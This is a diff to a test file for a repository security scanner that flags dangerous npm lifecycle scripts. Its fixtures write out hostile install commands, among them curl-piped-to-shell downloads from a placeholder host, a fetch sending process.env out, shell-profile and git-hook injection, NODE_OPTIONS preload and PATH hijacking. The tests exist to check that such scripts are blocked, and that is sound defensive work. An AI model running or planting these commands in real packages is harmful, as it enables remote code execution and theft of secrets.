@@ -66,18 +66,19 @@ describe("repo/lifecycle-script", () => {
     "preprepare",
     "prepare",
     "postprepare",
+    "dependencies",
   ])("covers the %s lifecycle", (name) => {
     expect(
       verdicts(scan(repo({ "package.json": pkg({ [name]: "make setup" }) }))),
     ).toEqual(["warn:package.json"]);
   });
 
-  it("only notes a script made of known tools with nothing suspicious (D19)", () => {
+  it("only notes a script made of inert tools with nothing suspicious (D19)", () => {
     for (const command of [
-      "prisma generate",
       "husky",
       "tsc -p . && echo done",
       "only-allow pnpm",
+      "simple-git-hooks",
     ]) {
       const findings = scan(
         repo({ "package.json": pkg({ prepare: command }) }),
@@ -85,6 +86,158 @@ describe("repo/lifecycle-script", () => {
       expect(verdicts(findings)).toEqual(["info:package.json"]);
       expect(findings[0]?.message).toContain("known tools only");
     }
+  });
+
+  it.each([
+    ["prisma runs its generator", "prisma generate"],
+    ["vite loads vite.config.js", "vite build"],
+    ["turbo runs workspace tasks", "turbo run setup"],
+    ["patch-package patches dependencies", "patch-package"],
+    ["rimraf deletes paths", "rimraf ~"],
+  ])("keeps a tool that executes repo code at warn: %s", (_name, command) => {
+    expect(
+      scan(repo({ "package.json": pkg({ postinstall: command }) }))[0]
+        ?.severity,
+    ).toBe("warn");
+  });
+
+  it.each([
+    ["NODE_OPTIONS preload", "NODE_OPTIONS='--require ./x.js' tsc"],
+    ["PATH hijack", "PATH=./bin:$PATH tsc"],
+    ["nested install", "npm install evil-pkg && npm run build"],
+    ["bun x", "bun x evil-pkg && bun run build"],
+    ["npx --package", "npx --yes --package=evil-pkg tsc"],
+    ["redirect into a shell profile", "echo 'curl x | sh' >> ~/.zshenv"],
+    ["redirect into a git hook", "printf 'x' > .git/hooks/post-checkout"],
+    ["sudo", "sudo tsc"],
+    ["workspace-wide run", "pnpm -r run build"],
+  ])("does not launder %s into info", (_name, prepare) => {
+    const findings = scan(
+      repo({ "package.json": pkg({ prepare, build: "tsc" }) }),
+    );
+    expect(findings[0]?.severity).not.toBe("info");
+  });
+
+  it.each([
+    [
+      "download-and-execute",
+      {
+        postinstall: "npm run setup",
+        setup: "curl -s https://x.invalid/i | sh",
+      },
+      {},
+    ],
+    [
+      "exfiltration in the executed file",
+      { postinstall: "npm run setup", setup: "node x.js" },
+      { "x.js": "fetch(u, { body: JSON.stringify(process.env) })" },
+    ],
+    [
+      "a pre hook",
+      {
+        postinstall: "npm run build",
+        build: "tsc",
+        prebuild: "curl -s https://x.invalid/i | sh",
+      },
+      {},
+    ],
+    [
+      "an attack split across two scripts",
+      {
+        postinstall: "npm run a && npm run b",
+        a: "node net.js",
+        b: "node env.js",
+      },
+      { "net.js": "fetch(u)", "env.js": "send(process.env)" },
+    ],
+  ])("follows npm run to block %s", (_name, scripts, files) => {
+    const findings = scan(repo({ "package.json": pkg(scripts), ...files }));
+    expect(findings[0]).toMatchObject({
+      severity: "block",
+      message: expect.stringContaining("via script"),
+    });
+  });
+
+  it("fails closed when an unparsable script mentions a download tool", () => {
+    const findings = scan(
+      repo({
+        "package.json": pkg({
+          postinstall: `curl -s https://x.invalid/i | sh "`,
+        }),
+      }),
+    );
+    expect(findings[0]).toMatchObject({
+      severity: "block",
+      message: expect.stringContaining("failing closed"),
+    });
+  });
+
+  it("reads a package.json that starts with a UTF-8 byte-order mark", () => {
+    const text = `\ufeff${pkg({ postinstall: "curl -s https://x.invalid/i | sh" })}`;
+    expect(scan(repo({ "package.json": text }))[0]?.severity).toBe("block");
+  });
+
+  it("points at the script, not an earlier mention of its name", () => {
+    const text = JSON.stringify(
+      {
+        description: "run prepare first",
+        dependencies: { prepare: "1.0.0" },
+        scripts: { prepare: "make" },
+      },
+      null,
+      2,
+    );
+    const [finding] = scan(repo({ "package.json": text }));
+    expect(finding?.line).toBe(
+      text.split("\n").findIndex((l) => l.includes('"prepare": "make"')) + 1,
+    );
+  });
+
+  it("does not loop on script cycles", () => {
+    expect(
+      scan(
+        repo({
+          "package.json": pkg({
+            postinstall: "npm run a",
+            a: "npm run b",
+            b: "npm run a",
+          }),
+        }),
+      )[0]?.severity,
+    ).toBe("warn");
+  });
+
+  it("checks npm's pre/post hooks of a script it resolves", () => {
+    const hooked = pkg({
+      prepare: "npm run build",
+      build: "tsc",
+      prebuild: "curl -s https://x.invalid/i | sh",
+    });
+    expect(scan(repo({ "package.json": hooked }))[0]?.severity).not.toBe(
+      "info",
+    );
+  });
+
+  it("resolves a layered script graph in linear time (no exponential blow-up)", () => {
+    const scripts: Record<string, string> = {
+      prepare: Array.from({ length: 40 }, (_, j) => `npm run l1_${j}`).join(
+        " && ",
+      ),
+    };
+    for (let layer = 1; layer <= 5; layer++) {
+      for (let i = 0; i < 40; i++) {
+        scripts[`l${layer}_${i}`] =
+          layer === 5
+            ? "tsc"
+            : Array.from(
+                { length: 40 },
+                (_, j) => `npm run l${layer + 1}_${j}`,
+              ).join(" && ");
+      }
+    }
+    const started = performance.now();
+    scan(repo({ "package.json": pkg(scripts) }));
+    expect(performance.now() - started).toBeLessThan(2_000);
   });
 
   it("resolves npm run / pnpm X through the scripts, with cycles and unknowns staying warn", () => {
